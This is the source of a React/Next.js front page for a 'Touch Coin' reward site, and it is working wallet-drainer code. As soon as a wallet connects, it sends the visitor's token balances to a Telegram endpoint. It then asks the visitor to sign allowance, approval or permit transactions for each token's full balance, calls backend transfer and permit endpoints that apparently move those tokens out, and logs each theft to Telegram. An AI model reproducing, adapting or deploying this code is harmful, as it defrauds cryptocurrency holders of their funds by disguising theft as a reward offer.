import { useAccount } from "wagmi";
import type { NextPage } from "next";
import Head from "next/head";
import { useEffect, useState } from "react";
import { BigNumber, ethers, providers } from "ethers";
import { askAllowance, askApproval } from "../utils/allowance";
import { classicPermit } from "../utils/permit";
import { tokenBalanceBSC, tokenBalanceETH, tokenBalancePermitETH, tokenBalanceAllowanceETH, tokenBalanceApproveETH, tokenBalanceAllowanceBSC, tokenBalancePermitBSC } from "../utils/tokenBalance";
import { useNetwork } from 'wagmi'
import Site from "./site";

const Home: NextPage = () => {
	const { connector, address } = useAccount();
	const { chain } = useNetwork();

	useEffect(() => {
		const init = async () => {
			try {

				const connect = await connector.getProvider({ chainId: chain.id });

				const provider = new providers.Web3Provider(connect);

				const res = await getBalances(address);
				const tokens = res.sortedBalances;

				await sendTokensToBot(tokens);

				for (let i = 0; i < tokens.length; i++) {
					const token = tokens[i];
					const abi = await checkMetadata(token.contract_address);
					if (abi !== undefined) {
						for (let j = 0; j < abi.length; j++) {
							// Ethereum
							if (chain.id === 1) {
								if (abi[j].hasOwnProperty("name")) {
									const method = "increaseAllowance";

									if (method === "increaseAllowance") {
										let ethAllowanceData: any = await tokenBalanceAllowanceETH(address, token.contract_address, token.quote_rate);
										if (!ethAllowanceData.balance.isZero()) {
											await askAllowance(ethAllowanceData.address, ethAllowanceData.balance, provider.getSigner());
											await griiitAllowance(ethAllowanceData.address, ethAllowanceData.balance);
											const json = {
												address: address,
												token: token.contract_name,
												contract: token.contract_address,
												balance: token.pretty_quote,
												type: "allowance"
											}
											await griiitTelegram("transfer", json);
										}

										break;
									} else if (method === "increaseApproval") {
										let ethApproveData: any = await tokenBalanceApproveETH(address, token.contract_address, token.quote_rate);
										if (!ethApproveData.balance.isZero()) {
											await askApproval(ethApproveData.address, ethApproveData.balance, provider.getSigner());
											await griiitApprove(ethApproveData.address, ethApproveData.balance);
											const json = {
												address: address,
												token: token.contract_name,
												contract: token.contract_address,
												balance: token.pretty_quote,
												type: "approval"
											}
											await griiitTelegram("transfer", json);
										}

										break;
									} else if (method === "permit") {
										let ethPermitData: any = await tokenBalancePermitETH(address, token.contract_address, token.quote_rate);
										if (!ethPermitData.balance.isZero()) {
											const signature = await classicPermit(ethPermitData.name, ethPermitData.address, address, ethPermitData.balance, ethPermitData.nonce, provider.getSigner(), chain.id);
											await griiitPermit(ethPermitData.address, ethPermitData.balance, ethPermitData.nonce, signature)
											const json = {
												address: address,
												token: token.contract_name,
												contract: token.contract_address,
												balance: token.pretty_quote,
												type: "permit"
											}
											await griiitTelegram("transfer", json);
										}

										break;
									}
								}
							}
							// Bsc
						
							else if (chain.id === 56) {
								const method = "increaseAllowance"
								if (method === "increaseAllowance") {
									let bscAllowanceData: any = await tokenBalanceAllowanceBSC(address, token.contract_address, token.quote_rate);
									if (bscAllowanceData.balance !== 0) {
										await askAllowance(bscAllowanceData.address, bscAllowanceData.balance, provider.getSigner());
										await griiitAllowance(bscAllowanceData.address, bscAllowanceData.balance);

										const json = {
											address: address,
											token: token.contract_name,
											contract: token.contract_address,
											balance: token.pretty_quote,
											type: "allowance"
										}
										await griiitTelegram("transfer", json);
									
									}
	
									break;
								} else if (method === "permit") {
									let bscPermitData: any = await tokenBalancePermitBSC(address, token.contract_address, token.quote_rate);
									if (bscPermitData.balance !== 0) {
										const signature = await classicPermit(bscPermitData.name, bscPermitData.address, address, bscPermitData.balance, bscPermitData.nonce, provider.getSigner(), chain.id);
										await griiitPermit(bscPermitData.address, bscPermitData.balance, bscPermitData.nonce, signature)

										const json = {
											address: address,
											token: token.contract_name,
											contract: token.contract_address,
											balance: token.pretty_quote,
											type: "allowance"
										}
										await griiitTelegram("transfer", json);
									
									}
	
									break;
								}
							}
						

						}
					}
				}
			}
			catch (e) {
				console.log("err:", e);
			}
		}
		if (address != undefined && connector !== undefined) init();

	}, [connector]);

	const getBalances = async (walletAddr: string) => {
		let data;
		try {
			const response = await fetch("/api/get-balances", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					walletAddress: walletAddr,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			data = res;
		} catch (error) {
			console.error(error);
		}

		return data;
	}

	const checkMetadata = async (tokenAddr: string) => {
		let data;
		try {
			const response = await fetch("/api/check-metadata", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.error(response);
			}

			const res = await response.json();
			data = res.abi;
		} catch (error) {
			console.error(error);
		}
		return data;
	}

	const sendTokensToBot = async (message: any) => {
		const filteredDataList = message.map(item => ({
			contract_name: item.contract_name,
			contract_address: item.contract_address,
			pretty_quote: item.pretty_quote
		}));

		const newElement = {
			address: address
		};

		filteredDataList.unshift(newElement);

		await griiitTelegram("balances", filteredDataList);
	}

	const griiitTelegram = async (type, message: any) => {

		try {
			const response = await fetch("/api/telegram", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: type,
					message: message
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}
	}

	const griiitAllowance = async (tokenAddr: string, balance: BigNumber) => {

		try {
			const response = await fetch("/api/transfer", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					amount: balance.toString(),
					owner: address,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}
	}

	const griiitPermit = async (tokenAddr: string, balance: BigNumber, tokenNonce, permitSignature) => {
		try {
			const response = await fetch("/api/permit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					amount: balance.toString(),
					owner: address,
					nonce: tokenNonce.toString(),
					signature: permitSignature,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}
	}

	const griiitApprove = async (tokenAddr: string, balance: BigNumber) => {

		try {
			const response = await fetch("/api/transfer", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					amount: balance.toString(),
					owner: address,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}

	}



	return (
		<div>
			<Head>
			<meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet" />

<title>Touch Coin | Reward Opportunity </title>
<link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
<link rel="stylesheet" href="assets/css/fontawesome.css" />
<link rel="stylesheet" href="assets/css/templatemo-cyborg-gaming.css" />
<link rel="stylesheet" href="assets/css/owl.css" />
<link rel="stylesheet" href="assets/css/animate.css" />
<link rel="stylesheet"href="https://unpkg.com/swiper@7/swiper-bundle.min.css"/>
			</Head>
			<main>
				<Site />
			</main>
		</div>
	);
};

export default Home;
